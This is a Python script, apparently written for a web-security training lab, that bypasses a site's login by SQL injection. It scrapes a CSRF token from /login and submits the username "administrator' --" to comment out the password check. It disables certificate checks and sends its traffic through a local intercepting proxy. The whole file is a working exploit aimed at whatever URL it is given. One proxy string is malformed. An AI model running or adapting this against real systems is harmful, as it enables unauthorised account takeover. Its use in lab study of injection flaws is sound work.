import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http/127.0.0.1:8080', 'https':'127.0.0.1:8080'}

def get_csrf_token(s, url):
    get_url_path = '/login'
    res = s.get(url+get_url_path, verify = False, proxies = proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf
def sql_injection(s, url):
    url_path = '/login'
    csrf_token = get_csrf_token(s, url)
    username = "administrator' --"
    data = {'csrf': csrf_token, 'username': username, 'password':'pass'}
    res = s.post(url+url_path, data=data, verify=False, proxies=proxies)
    if 'administrator' in res.text:
        print("(+) SQL Injection successful")
    else:
        print("(+) SQL Injection failed")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: python3 sql_injection_lab2.py <url> ")
        print("(+) %s http://example.com ")
        sys.exit(-1)
    url = sys.argv[1]
    print("(+) Exploiting SQL Injection Vulnerability...")
    s = requests.session()
    sql_injection(s, url)

if __name__ == '__main__':
    main()